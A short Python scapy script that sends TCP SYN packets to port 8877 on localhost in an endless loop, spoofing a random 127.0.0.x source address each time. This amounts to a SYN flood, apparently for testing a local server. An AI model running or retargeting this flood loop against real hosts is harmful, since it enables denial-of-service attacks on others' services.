#from scapy.layers.inet import IP, ICMP, TCP
import scapy.all as scapy
from scapy.sendrecv import sr
import sys
from scapy.config import conf
import random
conf.use_pcap = True
#conf.L3socket=scapy.L3RawSocket

#ip = scapy.IP(src="172.21.21.220",dst="127.0.0.1")
ip = scapy.IP(dst="127.0.0.1")
SYN = scapy.TCP(dport=8877, flags="S")
#SYN = scapy.TCP(sport=40508, dport=8877, flags="S", seq=1234)

#SYNACK=scapy.sr1(ip/SYN)
#SYNACK=scapy.sr(ip/SYN)
SYNACK=scapy.send(ip/SYN)

while True:
    ip.src=f"127.0.0.{random.randint(0, 255)}"
    SYNACK=scapy.send(ip/SYN)
    #sleep(0.01)

# ACK
'''
ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
scapy.send(ip/ACK)
'''

